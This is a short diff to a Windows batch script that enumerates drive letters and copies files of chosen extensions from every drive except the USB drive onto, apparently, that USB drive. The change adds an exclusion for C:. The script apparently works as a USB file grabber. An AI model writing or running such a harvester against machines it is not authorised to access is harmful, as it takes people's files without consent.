@@ -19,7 +19,7 @@ echo USB drive letter: %usb_drive%
 REM Get list of all drive letters
 for /f %%D in ('wmic logicaldisk get caption ^| findstr /r "[A-Z]:"') do (
     REM Check if the current drive is not the USB drive
-    if /i not "%%D"=="%usb_drive%" (
+    if /i not "%%D"=="%usb_drive%" if /i not "%%D"=="C:" (
         REM Debug output: Display current drive being searched
         echo copying from %%D
         REM Search for files with specified extensions on the drive and copy them to the destination folder
